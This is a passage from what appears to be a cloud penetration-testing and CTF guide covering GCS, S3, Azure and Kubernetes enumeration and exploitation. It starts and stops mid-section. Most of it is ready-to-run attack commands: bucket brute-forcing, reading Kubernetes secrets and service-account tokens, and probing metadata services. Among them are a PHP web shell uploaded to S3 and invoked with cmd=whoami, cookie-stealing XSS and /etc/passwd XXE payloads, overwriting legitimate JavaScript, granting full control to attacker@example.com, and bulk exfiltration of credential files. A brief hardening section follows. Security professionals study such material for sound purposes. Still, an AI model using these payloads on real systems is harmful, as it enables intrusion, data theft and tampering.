curl https://storage.googleapis.com/target-company-backups/file.txt

# Using gsutil
gsutil ls gs://target-company-backups
gsutil ls -r gs://target-company-backups/**
gsutil cp gs://target-company-backups/file.txt .

# Check bucket IAM permissions
gsutil iam get gs://target-company-backups

# Test anonymous access
gsutil -m cp -r gs://target-company-backups /tmp/target-data
```

**GCS Bucket Brute Force:**

```bash
# GCPBucketBrute - automated GCS bucket discovery
git clone https://github.com/RhinoSecurityLabs/GCPBucketBrute.git
cd GCPBucketBrute
pip3 install -r requirements.txt

# Generate wordlist
python3 gcpbucketbrute.py -k keyword_file.txt -g

# Scan for buckets
python3 gcpbucketbrute.py -w wordlist.txt

# Bucket-finder alternative
wget https://raw.githubusercontent.com/digininja/bucket-finder/master/bucket_finder.rb
ruby bucket_finder.rb target-company wordlist.txt
```

**GCS ACL Exploitation:**

```bash
# Check bucket ACL
curl https://storage.googleapis.com/storage/v1/b/target-bucket/iam

# Check object ACL
curl https://storage.googleapis.com/storage/v1/b/target-bucket/o/file.txt/acl

# Make bucket public (if permissions exist)
gsutil iam ch allUsers:objectViewer gs://target-bucket

# Upload file to public bucket
curl -X POST -H "Content-Type: application/octet-stream" \
  --data-binary @payload.txt \
  https://storage.googleapis.com/upload/storage/v1/b/target-bucket/o?uploadType=media&name=uploaded.txt

# Test write access
echo "test" > test.txt
gsutil cp test.txt gs://target-bucket/test.txt
```

### Public API Endpoints & Services

**AWS Public API Discovery:**

```bash
# Lambda function URLs (FURLs)
# Format: https://[unique-id].lambda-url.[region].on.aws/

# Discover via subdomain enumeration
subfinder -d target.com | grep lambda-url

# API Gateway endpoints
# Format: https://[api-id].execute-api.[region].amazonaws.com/[stage]

# Discover via certificate transparency
curl -s "https://crt.sh/?q=%.execute-api.amazonaws.com&output=json" | jq -r '.[].name_value' | grep target

# CloudFront distributions
# Format: https://[distribution-id].cloudfront.net

# Check for CloudFront distributions
dig target.com | grep cloudfront
curl -I https://target.com | grep -i x-amz-cf-id

# ElasticBeanstalk applications
# Format: http://[app-name].[region].elasticbeanstalk.com

# ECS/Fargate endpoints
# Format: http://[service-name]-[random].[region].elb.amazonaws.com
```

**Azure Public Endpoints:**

```bash
# Azure Functions
# Format: https://[function-app-name].azurewebsites.net/api/[function-name]

# Discover function apps
curl -s "https://crt.sh/?q=%.azurewebsites.net&output=json" | jq -r '.[].name_value' | grep target

# Azure App Services
# Format: https://[app-name].azurewebsites.net

# Azure API Management
# Format: https://[api-name].azure-api.net

# Azure Container Instances
# Format: http://[container-group].[region].azurecontainer.io

# Test function app access
curl https://target-function.azurewebsites.net/api/function-name
curl https://target-function.azurewebsites.net/api/function-name?code=[function-key]

# SCM endpoint (Kudu)
curl https://target-function.scm.azurewebsites.net
```

**GCP Public Endpoints:**

```bash
# Cloud Functions
# Format: https://[region]-[project-id].cloudfunctions.net/[function-name]

# Discover via certificate transparency
curl -s "https://crt.sh/?q=%.cloudfunctions.net&output=json" | jq -r '.[].name_value' | grep target

# Cloud Run services
# Format: https://[service-name]-[hash]-[region].a.run.app

# App Engine
# Format: https://[project-id].[region].r.appspot.com

# Cloud Endpoints
# Format: https://[api-name]-[hash]-[region].a.run.app

# Test unauthenticated access
curl https://us-central1-target-project.cloudfunctions.net/functionName
curl https://target-service-hash-uc.a.run.app
```

### Kubernetes & Container Registry Exposure

**Docker Registry Enumeration:**

```bash
# Public Docker registries
# Docker Hub: https://hub.docker.com/
# GitHub Container Registry: ghcr.io
# Quay.io: quay.io

# Docker Hub API enumeration
curl -s "https://hub.docker.com/v2/repositories/target-org/" | jq .

# List repositories
curl -s "https://hub.docker.com/v2/repositories/target-org/?page_size=100" | jq -r '.results[].name'

# Get image tags
curl -s "https://hub.docker.com/v2/repositories/target-org/repo-name/tags" | jq -r '.results[].name'

# Download image
docker pull target-org/repo-name:tag
docker save target-org/repo-name:tag -o image.tar
tar -xf image.tar

# Extract secrets from layers
find . -type f -exec grep -l "password\|secret\|key" {} \;

# AWS ECR (Elastic Container Registry)
# Format: [account-id].dkr.ecr.[region].amazonaws.com/[repository]

# List ECR repositories (requires credentials)
aws ecr describe-repositories --region us-east-1

# Get ECR login token
aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin [account-id].dkr.ecr.us-east-1.amazonaws.com

# Azure Container Registry
# Format: [registry-name].azurecr.io

# List repositories (if anonymous access enabled)
curl https://target.azurecr.io/v2/_catalog

# List tags
curl https://target.azurecr.io/v2/repository-name/tags/list

# GCP Container Registry / Artifact Registry
# Format: gcr.io/[project-id] or [region]-docker.pkg.dev/[project-id]/[repository]

# List GCR images
curl https://gcr.io/v2/project-id/repository/tags/list

# Pull image (if public)
docker pull gcr.io/project-id/repository:tag
```

**Public Kubernetes API Exposure:**

```bash
# Kubernetes API server detection
# Common ports: 6443, 8443, 443

# Shodan queries
# ssl:"Kubernetes Ingress"
# http.title:"Kubernetes"
# ssl:"kubernetes"

# Check for exposed API
curl -k https://target-k8s-api:6443/api/v1

# Unauthenticated API access
curl -k https://target-k8s-api:6443/api/v1/namespaces
curl -k https://target-k8s-api:6443/api/v1/pods
curl -k https://target-k8s-api:6443/api/v1/secrets

# Using kubectl with stolen kubeconfig
export KUBECONFIG=/path/to/stolen/kubeconfig
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces

# Check for service account tokens in compromised containers
cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) get pods

# Dashboard exposure
# Format: https://[cluster-endpoint]/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/

# kubeletctl - Kubelet exploitation tool
wget https://github.com/cyberark/kubeletctl/releases/download/v1.9/kubeletctl_linux_amd64
chmod +x kubeletctl_linux_amd64
./kubeletctl_linux_amd64 scan --cidr 10.0.0.0/24

# Test kubelet API (port 10250)
curl -k https://target-node:10250/pods
```

### Subdomain & DNS Enumeration for Cloud Resources

**Comprehensive Subdomain Discovery:**

```bash
# Install subdomain enumeration tools
sudo apt install -y subfinder amass assetfinder
go install github.com/tomnomnom/assetfinder@latest
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/owasp-amass/amass/v4/...@master

# Subfinder
subfinder -d target.com -all -recursive -o subdomains.txt

# Amass
amass enum -d target.com -config ~/.config/amass/config.ini -o amass-results.txt

# Assetfinder
assetfinder --subs-only target.com | tee assetfinder-results.txt

# Certificate Transparency
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > crt-subdomains.txt

# Combine results
cat subdomains.txt amass-results.txt assetfinder-results.txt crt-subdomains.txt | sort -u > all-subdomains.txt

# Filter for cloud resources
grep -E "s3|amazonaws|cloudfront|blob|azure|googleapis|cloudfunctions|run\.app" all-subdomains.txt > cloud-subdomains.txt
```

**Cloud-Specific DNS Records:**

```bash
# Check for cloud provider indicators
cat all-subdomains.txt | while read domain; do
    dig $domain A CNAME | grep -E "amazonaws|cloudfront|azure|googleapis|cloudflare"
done

# Identify S3 buckets via CNAME
dig assets.target.com CNAME | grep s3

# Identify CloudFront distributions
dig cdn.target.com A | grep cloudfront

# Identify Azure resources
dig app.target.com CNAME | grep azure

# Check for dangling DNS records (subdomain takeover)
cat all-subdomains.txt | while read domain; do
    response=$(curl -s -o /dev/null -w "%{http_code}" http://$domain)
    if [ "$response" == "404" ]; then
        echo "[!] Potential subdomain takeover: $domain"
        dig $domain CNAME
    fi
done
```

**Automated Cloud Asset Discovery:**

```bash
# Cloud_enum - multi-cloud asset enumeration
git clone https://github.com/initstring/cloud_enum.git
cd cloud_enum
pip3 install -r requirements.txt

# Enumerate AWS, Azure, GCP resources
python3 cloud_enum.py -k target-company -k target

# Specify keyword file
echo "target-company" > keywords.txt
echo "target" >> keywords.txt
python3 cloud_enum.py -kf keywords.txt -l output.txt

# CloudBrute - cloud infrastructure enumeration
git clone https://github.com/0xsha/CloudBrute.git
cd CloudBrute
go build

# Scan for cloud resources
./CloudBrute -d target.com -k keyword.txt -w wordlist.txt -o results.txt
```

### Shodan & Certificate Transparency

**Shodan Queries for Cloud Resources:**

```bash
# Install Shodan CLI
pip3 install shodan

# Initialize API key
shodan init YOUR_API_KEY

# Search for AWS resources
shodan search "hostname:target.com ssl:amazonaws"
shodan search "org:target ssl:cloudfront"

# Search for Azure resources
shodan search "hostname:target.com ssl:azure"
shodan search "azurewebsites.net org:target"

# Search for GCP resources
shodan search "hostname:target.com ssl:googleapis"
shodan search "cloudfunctions.net org:target"

# Exposed Kubernetes
shodan search "product:Kubernetes"
shodan search "port:6443 ssl:kubernetes"
shodan search "http.title:Kubernetes"

# Exposed Docker registries
shodan search "product:Docker port:2375"
shodan search "Docker Registry API port:5000"

# Exposed metadata services (misconfigured proxies)
shodan search "http.html:169.254.169.254"

# Cloud management panels
shodan search "http.title:AWS port:443"
shodan search "http.title:Azure"
```

**Certificate Transparency Monitoring:**

```bash
# Certstream - real-time CT log monitoring
git clone https://github.com/CaliDog/certstream-python.git
cd certstream-python
pip3 install -r requirements.txt

# Monitor for target domains
python3 example.py | grep target.com

# CertStream filter for cloud resources
python3 example.py | grep -E "s3|cloudfront|azure|googleapis"

# Historical CT log search
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Filter by date
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[] | select(.entry_timestamp >= "2024-01-01") | .name_value' | sort -u

# Find wildcards
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | grep "^\*\."
```

### OSINT Framework & Automation

**Recon-ng Framework:**

```bash
# Install Recon-ng
sudo apt install -y recon-ng

# Launch and configure
recon-ng

# Add API keys
marketplace install all
keys add shodan_api YOUR_KEY
keys add censys_api YOUR_KEY
keys add virustotal_api YOUR_KEY

# Load workspace
workspaces create target

# Add domain
db insert domains target.com

# Run reconnaissance modules
marketplace search
modules load recon/domains-hosts/hackertarget
run

# Cloud-specific modules
modules load recon/domains-hosts/certificate_transparency
run

# Export results
show hosts
db query SELECT * FROM hosts WHERE host LIKE '%cloudfront%' OR host LIKE '%s3%' OR host LIKE '%azure%'
```

**SpiderFoot - OSINT Automation:**

```bash
# Install SpiderFoot
git clone https://github.com/smicallef/spiderfoot.git
cd spiderfoot
pip3 install -r requirements.txt

# Launch web interface
python3 sf.py -l 127.0.0.1:5001

# Command line scan
python3 sfcli.py -s target.com -t DOMAIN_NAME -o json -q > spiderfoot-results.json

# Filter for cloud resources
cat spiderfoot-results.json | jq '.[] | select(.type=="CLOUD_STORAGE" or .type=="LINKED_URL_EXTERNAL")' 
```

**TheHarvester - Email & Subdomain Harvesting:**

```bash
# Install TheHarvester
sudo apt install -y theharvester

# Comprehensive search
theHarvester -d target.com -b all -f theharvester-results

# Search specific sources
theHarvester -d target.com -b google,bing,yahoo,duckduckgo

# Certificate transparency
theHarvester -d target.com -b certspotter,crtsh

# Cloud-focused search
theHarvester -d target.com -b all | grep -E "s3|cloudfront|azure|googleapis"
```

### Workflow: Comprehensive Cloud Reconnaissance

**Step-by-Step CTF Reconnaissance Process:**

```bash
#!/bin/bash
# Comprehensive cloud reconnaissance script

TARGET="target.com"
OUTPUT_DIR="recon-$TARGET-$(date +%Y%m%d)"
mkdir -p $OUTPUT_DIR

echo "[*] Starting reconnaissance for $TARGET"

# 1. Subdomain enumeration
echo "[*] Step 1: Subdomain enumeration"
subfinder -d $TARGET -all -o $OUTPUT_DIR/subfinder.txt
amass enum -d $TARGET -o $OUTPUT_DIR/amass.txt
assetfinder --subs-only $TARGET > $OUTPUT_DIR/assetfinder.txt
curl -s "https://crt.sh/?q=%.$TARGET&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > $OUTPUT_DIR/crtsh.txt

# Combine and deduplicate
cat $OUTPUT_DIR/*.txt | sort -u > $OUTPUT_DIR/all-subdomains.txt

# 2. Cloud resource identification
echo "[*] Step 2: Identifying cloud resources"
grep -E "s3|amazonaws|cloudfront" $OUTPUT_DIR/all-subdomains.txt > $OUTPUT_DIR/aws-resources.txt
grep -E "blob|azure|azurewebsites" $OUTPUT_DIR/all-subdomains.txt > $OUTPUT_DIR/azure-resources.txt
grep -E "googleapis|cloudfunctions|run\.app|appspot" $OUTPUT_DIR/all-subdomains.txt > $OUTPUT_DIR/gcp-resources.txt

# 3. S3 bucket enumeration
echo "[*] Step 3: S3 bucket scanning"
cat $OUTPUT_DIR/aws-resources.txt | while read domain; do
    bucket=$(echo $domain | cut -d'.' -f1)
    aws s3 ls s3://$bucket --no-sign-request 2>/dev/null && echo "[+] Public bucket: $bucket" >> $OUTPUT_DIR/public-s3-buckets.txt
done

# 4. Check for metadata service (if running in cloud)
echo "[*] Step 4: Metadata service check"
timeout 2 curl -s http://169.254.169.254/latest/meta-data/ && echo "[!] AWS IMDS accessible" >> $OUTPUT_DIR/metadata-access.txt
timeout 2 curl -s -H "Metadata: true" http://169.254.169.254/metadata/instance && echo "[!] Azure IMDS accessible" >> $OUTPUT_DIR/metadata-access.txt
timeout 2 curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/ && echo "[!] GCP metadata accessible" >> $OUTPUT_DIR/metadata-access.txt

# 5. GitHub reconnaissance
echo "[*] Step 5: GitHub search"
curl -s "https://api.github.com/search/code?q=org:$TARGET+filename:.env" | jq . > $OUTPUT_DIR/github-dotenv.json
curl -s "https://api.github.com/search/code?q=org:$TARGET+aws_access_key_id" | jq . > $OUTPUT_DIR/github-aws-keys.json

echo "[*] Reconnaissance complete. Results in $OUTPUT_DIR/"
```

---

## Related High-Value Topics

**Essential for deeper cloud exploitation:**

- SSRF exploitation techniques for cloud metadata services
- S3 bucket policy analysis and privilege escalation paths
- Azure AD token manipulation and JWT attacks
- GCP service account impersonation chains
- Container escape techniques (runc, Docker, Kubernetes)
- Cloud-native application security (serverless injection, API Gateway bypass)

---

# AWS Security Testing

## S3 Bucket Enumeration and Exploitation

Amazon S3 (Simple Storage Service) buckets are object storage containers frequently misconfigured, leading to unauthorized data exposure, modification, or deletion. Understanding S3 permissions, access control mechanisms, and enumeration techniques is critical for security assessments.

### S3 Permission Model

**Access Control Mechanisms:**

S3 employs multiple overlapping permission systems:

- **Bucket Policies** - JSON-based resource policies attached to buckets
- **Access Control Lists (ACLs)** - Legacy permission system at bucket/object level
- **IAM Policies** - Identity-based policies for AWS principals
- **Block Public Access** - Account/bucket-level settings overriding other permissions

**Permission Types:**

- `READ` - List objects in bucket
- `WRITE` - Create, overwrite, delete objects
- `READ_ACP` - Read ACL permissions
- `WRITE_ACP` - Modify ACL permissions
- `FULL_CONTROL` - All permissions combined

**Common Misconfigurations:**

- Public read access (`s3:GetObject` for `*`)
- Authenticated user access (any AWS account)
- Overly permissive bucket policies
- ACL grants to `AllUsers` or `AuthenticatedUsers`
- Disabled Block Public Access settings

### Bucket Discovery Techniques

**DNS-Based Discovery:**

```bash
# S3 bucket naming follows DNS conventions
# Enumerate subdomains that may be bucket names
subfinder -d target.com -silent | grep -E '(s3|aws|bucket|backup|static)'

# Test DNS resolution for potential buckets
for name in target target-dev target-prod target-backup target-assets; do
    host ${name}.s3.amazonaws.com
done

# Check for CNAME records pointing to S3
dig target.com CNAME +short | grep s3

# Zone transfer attempts (rarely successful but worth trying)
dig @ns1.target.com target.com AXFR | grep s3
```

**Certificate Transparency Discovery:**

```bash
# Extract S3 references from CT logs
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | grep -i s3

# Search for S3 bucket patterns in certificates
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | while read domain; do
    echo "$domain" | sed 's/\*\.//' | sed 's/\.s3\.amazonaws\.com//'
done | sort -u
```

**Web Content Scraping:**

```bash
# Extract S3 URLs from target website
curl -s https://target.com | grep -oP 'https?://[a-zA-Z0-9.-]+\.s3[a-zA-Z0-9.-]*\.amazonaws\.com/[^"'\''<> ]*'

# Download and analyze JavaScript files
curl -s https://target.com | grep -oE 'src="[^"]*\.js"' | cut -d'"' -f2 | while read js; do
    curl -s "$js" | grep -oP '[a-zA-Z0-9._-]+\.s3[a-zA-Z0-9.-]*\.amazonaws\.com'
done

# Search page source for bucket references
wget -qO- https://target.com | grep -Eo 's3://[a-zA-Z0-9._-]+'

# Mobile app decompilation analysis
# After extracting APK/IPA, search for S3 references
grep -r "s3.amazonaws.com" ./extracted_app/
grep -r "s3://" ./extracted_app/
```

**GitHub/Git Repository Reconnaissance:**

```bash
# Search GitHub for organization's S3 buckets
# Manual: https://github.com/search?q=org:target+s3.amazonaws.com

# Use truffleHog for secrets in git history
trufflehog git https://github.com/target/repo --only-verified

# Search for AWS credentials and config
git clone https://github.com/target/repo
grep -r "aws_access_key_id\|aws_secret_access_key\|s3://" repo/

# GitLeaks for sensitive data
gitleaks detect --source ./repo/ -v
```

**Automated Bucket Enumeration Tools:**

**s3scanner:**

```bash
# Installation
pip3 install s3scanner

# Scan from wordlist
s3scanner scan --buckets-file wordlist.txt

# Check specific bucket
s3scanner scan --bucket target-bucket-name

# Dump accessible bucket contents
s3scanner dump --bucket target-bucket-name --dump-dir ./s3_dump/

# Output formats
s3scanner scan --buckets-file wordlist.txt --out-file results.txt
s3scanner scan --buckets-file wordlist.txt --json > results.json
```

**S3Recon:**

```bash
# Installation
go install github.com/clarketm/s3recon@latest

# Basic enumeration
s3recon target -w wordlist.txt

# Specify regions
s3recon target -w wordlist.txt -r us-east-1,us-west-2

# JSON output
s3recon target -w wordlist.txt -o json > s3recon_results.json
```

**Slurp:**

```bash
# Installation
go install github.com/0xbharath/slurp@latest

# Domain-based enumeration
slurp domain -t target.com

# Keyword-based search
slurp keyword -t target-company

# Include permutations
slurp domain -t target.com --permutations
```

**AWS CLI Enumeration:**

```bash
# Test anonymous bucket access
aws s3 ls s3://bucket-name --no-sign-request

# List with authenticated access (if credentials available)
aws s3 ls s3://bucket-name

# Recursive listing with file sizes
aws s3 ls s3://bucket-name --recursive --human-readable --summarize --no-sign-request

# Test access across regions (bucket names are global but may be region-specific)
for region in us-east-1 us-west-2 eu-west-1 ap-southeast-1; do
    echo "Testing $region"
    aws s3 ls s3://bucket-name --region $region --no-sign-request 2>&1
done

# Copy specific file to test read permissions
aws s3 cp s3://bucket-name/file.txt ./file.txt --no-sign-request
```

### Permission Testing and Exploitation

**Permission Enumeration Matrix:**

```bash
#!/bin/bash
# Comprehensive S3 permission testing script

BUCKET=$1
TEST_FILE="test_$(date +%s).txt"
echo "test content" > $TEST_FILE

echo "[*] Testing bucket: $BUCKET"

# Test READ (List)
echo "[+] Testing READ permission..."
if aws s3 ls s3://$BUCKET --no-sign-request 2>&1 | grep -v "AccessDenied"; then
    echo "[!] READ: GRANTED (anonymous)"
elif aws s3 ls s3://$BUCKET 2>&1 | grep -v "AccessDenied"; then
    echo "[!] READ: GRANTED (authenticated)"
else
    echo "[-] READ: DENIED"
fi

# Test WRITE (Upload)
echo "[+] Testing WRITE permission..."
if aws s3 cp $TEST_FILE s3://$BUCKET/$TEST_FILE --no-sign-request 2>&1 | grep -v "AccessDenied"; then
    echo "[!] WRITE: GRANTED (anonymous)"
    # Cleanup
    aws s3 rm s3://$BUCKET/$TEST_FILE --no-sign-request 2>/dev/null
elif aws s3 cp $TEST_FILE s3://$BUCKET/$TEST_FILE 2>&1 | grep -v "AccessDenied"; then
    echo "[!] WRITE: GRANTED (authenticated)"
    aws s3 rm s3://$BUCKET/$TEST_FILE 2>/dev/null
else
    echo "[-] WRITE: DENIED"
fi

# Test READ_ACP
echo "[+] Testing READ_ACP permission..."
if aws s3api get-bucket-acl --bucket $BUCKET --no-sign-request 2>&1 | grep -v "AccessDenied"; then
    echo "[!] READ_ACP: GRANTED (anonymous)"
elif aws s3api get-bucket-acl --bucket $BUCKET 2>&1 | grep -v "AccessDenied"; then
    echo "[!] READ_ACP: GRANTED (authenticated)"
else
    echo "[-] READ_ACP: DENIED"
fi

# Test WRITE_ACP [Caution: Can escalate to full control]
echo "[+] Testing WRITE_ACP permission..."
if aws s3api put-bucket-acl --bucket $BUCKET --acl public-read --no-sign-request 2>&1 | grep -v "AccessDenied"; then
    echo "[!!!] WRITE_ACP: GRANTED (anonymous) - CRITICAL"
    # Revert changes
    aws s3api put-bucket-acl --bucket $BUCKET --acl private --no-sign-request 2>/dev/null
elif aws s3api put-bucket-acl --bucket $BUCKET --acl public-read 2>&1 | grep -v "AccessDenied"; then
    echo "[!!!] WRITE_ACP: GRANTED (authenticated) - CRITICAL"
    aws s3api put-bucket-acl --bucket $BUCKET --acl private 2>/dev/null
else
    echo "[-] WRITE_ACP: DENIED"
fi

rm -f $TEST_FILE
```

**Bucket Policy Analysis:**

```bash
# Retrieve bucket policy
aws s3api get-bucket-policy --bucket bucket-name --query Policy --output text | jq .

# Check for public access indicators
aws s3api get-bucket-policy --bucket bucket-name --query Policy --output text | jq . | grep -E '(Principal.*\*|Action.*\*|Allow)'

# Get bucket policy status
aws s3api get-bucket-policy-status --bucket bucket-name

# Check Block Public Access configuration
aws s3api get-public-access-block --bucket bucket-name
```

**ACL Analysis:**

```bash
# Get bucket ACL
aws s3api get-bucket-acl --bucket bucket-name

# Parse for public grants
aws s3api get-bucket-acl --bucket bucket-name | jq -r '.Grants[] | select(.Grantee.URI | contains("AllUsers") or contains("AuthenticatedUsers"))'

# Check object-level ACLs (for discovered objects)
aws s3api get-object-acl --bucket bucket-name --key path/to/object.txt

# List all objects with public ACLs
aws s3api list-objects-v2 --bucket bucket-name --query 'Contents[].Key' --output text | while read key; do
    aws s3api get-object-acl --bucket bucket-name --key "$key" | grep -q "AllUsers" && echo "Public: $key"
done
```

### Exploitation Techniques

**Data Exfiltration:**

```bash
# Download entire bucket (READ permission)
aws s3 sync s3://bucket-name ./local_backup/ --no-sign-request

# Download with directory structure preserved
aws s3 cp s3://bucket-name . --recursive --no-sign-request

# Selective download (sensitive files)
aws s3 ls s3://bucket-name --recursive --no-sign-request | grep -E '(\.env|config|secret|credential|password|key|backup|sql|dump)' | awk '{print $NF}' | while read file; do
    aws s3 cp "s3://bucket-name/$file" "./sensitive/$file" --no-sign-request
done

# Stream large files without full download
aws s3 cp s3://bucket-name/large-file.zip - --no-sign-request | head -c 1000
```

**Malicious File Upload (WRITE permission):**

```bash
# Upload web shell [Caution: Only in authorized testing]
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws s3 cp shell.php s3://bucket-name/shell.php --no-sign-request

# Access uploaded shell (if bucket has web hosting enabled)
curl http://bucket-name.s3.amazonaws.com/shell.php?cmd=whoami

# Upload for XSS (if bucket serves content to users)
echo '<script>alert(document.cookie)</script>' > xss.html
aws s3 cp xss.html s3://bucket-name/xss.html --no-sign-request --content-type "text/html"

# Upload for XXE/SSRF payloads
cat > xxe.xml <<EOF
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
EOF
aws s3 cp xxe.xml s3://bucket-name/xxe.xml --no-sign-request
```

**Object Overwrite (WRITE without versioning):**

```bash
# Overwrite existing legitimate file
aws s3 cp malicious.js s3://bucket-name/legitimate-app.js --no-sign-request

# Check if versioning is enabled
aws s3api get-bucket-versioning --bucket bucket-name

# If versioning enabled, list object versions
aws s3api list-object-versions --bucket bucket-name --prefix legitimate-app.js
```

**ACL Privilege Escalation (WRITE_ACP):**

```bash
# Grant yourself FULL_CONTROL [Caution: Authorized testing only]
aws s3api put-bucket-acl --bucket bucket-name --grant-full-control emailaddress=attacker@example.com

# Grant public read access
aws s3api put-bucket-acl --bucket bucket-name --acl public-read

# Custom ACL with specific permissions
aws s3api put-bucket-acl --bucket bucket-name --access-control-policy file://acl.json

# acl.json example:
cat > acl.json <<EOF
{
  "Grants": [
    {
      "Grantee": {
        "Type": "Group",
        "URI": "http://acs.amazonaws.com/groups/global/AllUsers"
      },
      "Permission": "READ"
    }
  ],
  "Owner": {
    "ID": "original-owner-canonical-id"
  }
}
EOF
```

**Bucket Policy Manipulation (Policy Write permissions):**

```bash
# Apply overly permissive policy [Caution: Critical operation]
cat > policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::bucket-name",
        "arn:aws:s3:::bucket-name/*"
      ]
    }
  ]
}
EOF
aws s3api put-bucket-policy --bucket bucket-name --policy file://policy.json
```

### Advanced Enumeration Techniques

**Bucket Name Pattern Generation:**

```bash
#!/bin/bash
# Generate comprehensive bucket name candidates

TARGET="target"
OUTPUT="bucket_candidates.txt"

# Environment patterns
for env in dev staging stage qa uat prod production test demo; do
    echo "${TARGET}-${env}"
    echo "${env}-${TARGET}"
    echo "${TARGET}${env}"
    echo "${TARGET}.${env}"
done > $OUTPUT

# Service/function patterns
for service in web app api mobile assets static media images uploads downloads backups logs backup archive; do
    echo "${TARGET}-${service}"
    echo "${service}-${TARGET}"
    echo "${TARGET}${service}"
done >> $OUTPUT

# Date-based patterns (common for backups)
for year in {2020..2025}; do
    echo "${TARGET}-backup-${year}"
    echo "${TARGET}-${year}"
    for month in {01..12}; do
        echo "${TARGET}-backup-${year}${month}"
        echo "${TARGET}-${year}${month}"
    done
done >> $OUTPUT

# Geographic patterns
for region in us eu asia ap; do
    echo "${TARGET}-${region}"
    echo "${region}-${TARGET}"
done >> $OUTPUT

# Common suffixes
for suffix in bucket s3 storage data files public private internal external; do
    echo "${TARGET}-${suffix}"
    echo "${suffix}-${TARGET}"
done >> $OUTPUT

# Domain-based patterns
echo "${TARGET}" | sed 's/\./-/g' >> $OUTPUT
echo "${TARGET}" | sed 's/\.//' >> $OUTPUT

# Remove duplicates
sort -u $OUTPUT -o $OUTPUT
echo "[+] Generated $(wc -l < $OUTPUT) unique candidates"
```

**Region-Specific Enumeration:**

```bash
# AWS regions list
REGIONS=(
    us-east-1 us-east-2 us-west-1 us-west-2
    ca-central-1
    eu-west-1 eu-west-2 eu-west-3 eu-central-1 eu-north-1
    ap-south-1 ap-northeast-1 ap-northeast-2 ap-southeast-1 ap-southeast-2
    sa-east-1
    me-south-1 af-south-1
)

# Test bucket existence across regions
BUCKET="target-bucket"
for region in "${REGIONS[@]}"; do
    echo "[*] Testing $region..."
    aws s3 ls s3://$BUCKET --region $region --no-sign-request 2>&1 | grep -v "NoSuchBucket"
done
```

**Object Enumeration and Analysis:**

```bash
# List all objects with metadata
aws s3api list-objects-v2 --bucket bucket-name --output json > objects.json

# Extract object keys
jq -r '.Contents[].Key' objects.json

# Find large files (potential databases/backups)
jq -r '.Contents[] | select(.Size > 10000000) | "\(.Size)\t\(.Key)"' objects.json | sort -rn

# Find recently modified objects
jq -r '.Contents[] | select(.LastModified > "2024-10-01") | "\(.LastModified)\t\(.Key)"' objects.json | sort -r

# Search for sensitive patterns in object keys
jq -r '.Contents[].Key' objects.json | grep -iE '(password|secret|credential|key|token|backup|dump|database|sql|env|config|private)'

# Get object metadata without downloading
aws s3api head-object --bucket bucket-name --key path/to/object.txt
```

**Server-Side Encryption Analysis:**

```bash
# Check default encryption settings
aws s3api get-bucket-encryption --bucket bucket-name

# Check individual object encryption
aws s3api head-object --bucket bucket-name --key object.txt --query 'ServerSideEncryption'

# List unencrypted objects
aws s3api list-objects-v2 --bucket bucket-name --query 'Contents[].Key' --output text | while read key; do
    encryption=$(aws s3api head-object --bucket bucket-name --key "$key" --query 'ServerSideEncryption' --output text 2>/dev/null)
    if [ "$encryption" == "None" ] || [ -z "$encryption" ]; then
        echo "Unencrypted: $key"
    fi
done
```

### S3 Bucket Exploitation in CTF Context

[Inference] Common CTF scenarios involving S3:

**Flag Discovery:**

```bash
# Search for flag files
aws s3 ls s3://bucket-name --recursive --no-sign-request | grep -iE '(flag|ctf|secret)'

# Download and inspect common flag locations
for file in flag.txt flag secret.txt README.md .env config.json; do
    aws s3 cp s3://bucket-name/$file . --no-sign-request 2>/dev/null
done

# Search object content for flags (requires download)
aws s3 sync s3://bucket-name ./bucket_dump/ --no-sign-request
grep -r "flag{" ./bucket_dump/
```

**Web Application Integration Exploitation:**

```bash
# If application loads resources from S3, upload malicious content
# Example: XSS via SVG upload
cat > xss.svg <<EOF
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
</svg>
EOF
aws s3 cp xss.svg s3://bucket-name/images/xss.svg --no-sign-request --content-type "image/svg+xml"

# Access: http://bucket-name.s3.amazonaws.com/images/xss.svg
```

**Credential Harvesting:**

```bash
# Search for AWS credentials in uploaded files
aws s3 sync s3://bucket-name ./creds_search/ --no-sign-request
grep -r "AKIA" ./creds_search/  # AWS Access Key ID pattern
grep -r "aws_secret_access_key" ./creds_search/
```

### Defensive Considerations and Detection

**Bucket Hardening Checklist:**

```bash
# Enable Block Public Access (account-level)
aws s3control put-public-access-block \
    --account-id ACCOUNT_ID \
    --public-access-block-configuration \
    BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true

# Enable bucket versioning
aws s3api put-bucket-versioning --bucket bucket-name --versioning-configuration Status=Enabled

# Enable server-side encryption
aws s3api put-bucket-encryption --bucket bucket-name --server-side-encryption-configuration '{
  "Rules": [{
    "ApplyServerSideEncryptionByDefault": {
      "SSEAlgorithm": "AES256"
    }
  }]
}'

# Enable logging
aws s3api put-bucket-logging --bucket bucket-name --bucket-logging-status '{
  "LoggingEnabled": {
    "TargetBucket": "logging-bucket",
    "TargetPrefix": "bucket-name/"
  }
}'
```

**Access Monitoring:**

```bash
# Enable CloudTrail for S3 data events
aws cloudtrail put-event-selectors --trail-name trail-name --event-selectors '[{
  "ReadWriteType": "All",
